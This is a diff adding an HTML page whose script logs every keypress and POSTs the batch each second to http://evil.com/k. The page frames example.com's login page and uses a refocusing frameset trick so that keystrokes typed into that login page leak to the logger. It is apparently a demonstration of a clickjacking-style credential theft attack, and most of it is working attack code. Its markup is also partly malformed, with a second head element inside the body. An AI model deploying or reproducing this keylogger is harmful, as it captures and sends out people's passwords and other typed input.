@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script>
+        // array of user keystrokes
+        var keystrokes = [];
+        // event listener which captures user keystrokes
+        document.onkeypress = function() {
+           keystrokes.push(window.event.keyCode);
+        }
+        // function which reports keystrokes back to evil.com every second
+        setInterval(function() {
+           if (keystrokes.length) {
+               var xhr = newXHR();
+               xhr.open("POST", "http://evil.com/k");
+               xhr.send(keystrokes.join("+"));
+           }
+           keystrokes = [];
+        }, 1000);
+        // function which creates an ajax request object
+        function newXHR() {
+           if (window.XMLHttpRequest)
+               return new XMLHttpRequest();
+           return new ActiveXObject("MSXML2.XMLHTTP.3.0");
+        }
+        </script>
+</head>
+<body>
+    <!-- http://evil.com/example.com-login.html -->
+<head>
+    
+    
+    <!-- re-focusing to this frameset tricks browser into leaking events -->
+    <frameset onload="this.focus()" onblur="this.focus()">
+    <!-- frame which embeds example.com login page -->
+    <frame src="http://example.com/login.html">
+    </frameset>
+</body>
+</html>
